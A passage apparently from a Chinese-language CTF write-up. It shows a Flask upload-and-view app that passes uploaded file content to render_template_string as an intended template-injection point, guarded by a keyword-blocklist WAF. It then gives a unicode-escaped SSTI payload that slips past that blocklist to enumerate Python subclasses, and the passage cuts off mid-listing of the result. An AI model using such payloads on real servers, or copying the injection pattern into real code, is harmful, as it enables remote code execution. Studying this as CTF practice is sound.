\</span><br><span class="line">        filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line">    <span class="comment"># \ 续航符</span></span><br><span class="line">    <span class="comment"># rsplit(sep,maxsplit) 从右侧分割</span></span><br><span class="line">    <span class="comment"># 检测后缀名</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 检查是否有文件被上传</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;未上传文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否选择了文件</span></span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;请选择文件&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证文件名和扩展名</span></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            <span class="comment"># 安全处理文件名</span></span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            <span class="comment"># 保存文件</span></span><br><span class="line">            save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename) <span class="comment"># 拼接路径 </span></span><br><span class="line">            file.save(save_path) <span class="comment"># 保存文件</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 返回文件路径（绝对路径）</span></span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: <span class="string">&quot;File uploaded successfully&quot;</span>,</span><br><span class="line">                <span class="string">&quot;path&quot;</span>: os.path.abspath(save_path) <span class="comment"># 将相对路径转换为绝对路径</span></span><br><span class="line">            &#125;), <span class="number">200</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;文件类型错误&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># GET 请求显示上传表单（可选）</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_safe_path</span>(<span class="params">basedir, path</span>):</span><br><span class="line">    <span class="keyword">return</span> os.path.commonpath([basedir,path]) <span class="comment"># 返回共有的有效路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_dangerous_keywords</span>(<span class="params">file_path</span>): <span class="comment"># waf</span></span><br><span class="line">    dangerous_keywords = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__globals__&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_content = <span class="built_in">str</span>(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> keyword <span class="keyword">in</span> dangerous_keywords:</span><br><span class="line">            <span class="keyword">if</span> keyword <span class="keyword">in</span> file_content:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>  <span class="comment"># 找到危险关键字，返回 True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># 文件内容中没有危险关键字</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 1. 过滤文件名</span></span><br><span class="line">        safe_filename = secure_filename(filename)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> safe_filename:</span><br><span class="line">            abort(<span class="number">400</span>, description=<span class="string">&quot;无效文件名&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 2. 构造完整路径</span></span><br><span class="line">        file_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], safe_filename) <span class="comment"># 这里进行了拼接路径</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 3. 路径安全检查</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_safe_path(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path):</span><br><span class="line">            abort(<span class="number">403</span>, description=<span class="string">&quot;禁止访问的路径&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 4. 检查文件是否存在</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):  </span><br><span class="line">            abort(<span class="number">404</span>, description=<span class="string">&quot;文件不存在&quot;</span>)</span><br><span class="line"></span><br><span class="line">        suffix=os.path.splitext(filename)[<span class="number">1</span>] <span class="comment"># 获取扩展名</span></span><br><span class="line">        <span class="built_in">print</span>(suffix)</span><br><span class="line">        <span class="keyword">if</span> suffix==<span class="string">&quot;.jpg&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.png&quot;</span> <span class="keyword">or</span> suffix==<span class="string">&quot;.gif&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> send_from_directory(<span class="string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> contains_dangerous_keywords(file_path):</span><br><span class="line">            <span class="comment"># 删除不安全的文件</span></span><br><span class="line">            os.remove(file_path)</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Waf!!!!&quot;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            file_data = f.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        tmp_str = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;zh&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;查看文件内容&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span></span><br><span class="line"><span class="string">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            &lt;footer&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/footer&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(name=safe_filename, data=file_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(tmp_str) <span class="comment"># 模板注入点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        app.logger.error(<span class="string">f&quot;文件查看失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        abort(<span class="number">500</span>, description=<span class="string">&quot;文件查看失败:&#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(e)))</span><br></pre></td></tr></table></figure><p>注入点是我们文件上传的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;\u005f\u005fclass\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005fbase\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005fsub&#x27;</span><span class="string">&#x27;classes\u005f\u005f&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure><p>获取object的子类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;symtable entry&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;anext_awaitable&#x27;&gt;, &lt;class &#x27;async_generator_asend&#x27;&gt;, &lt;class &#x27;async_generator_athrow&#x27;&gt;, &lt;class &#x27;async_generator_wrapped_value&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;weakref.CallableProxyType&#x27;&gt;, &lt;class &#x27;weakref.ProxyType&#x27;&gt;, &lt;class &#x27;weakref.ReferenceType&#x27;&gt;, &lt;class &#x27;types.UnionType&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;_contextvars.Context&#x27;&gt;, &lt;class &#x27;_contextvars.ContextVar&#x27;&gt;, &lt;class &#x27;_contextvars.Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;_distutils_hack._TrivialRe&#x27;&gt;, &lt;class &#x27;_distutils_hack.DistutilsMetaFinder&#x27;&gt;, &lt;class &#x27;_distutils_hack.shim&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.pairwise&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.KeyWrapper&#x27;&gt;, &lt;class &#x27;functools._lru_list_elem&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib.AsyncContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing._TypeVarLike&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.Annotated&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.TypedDict&#x27;&gt;, &lt;class &#x27;typing.NewType&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;array.array&#x27;&gt;, &lt;class &#x27;array.arrayiterator&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;ast.AST&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;_struct.Struct&#x27;&gt;, &lt;class &#x27;_struct.unpack_iterator&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.SSLSession&#x27;&gt;, &lt;class &#x27;_ssl.Certificate&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;traceback._Sentinel&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.mixins.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_hashlib.HMAC&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class 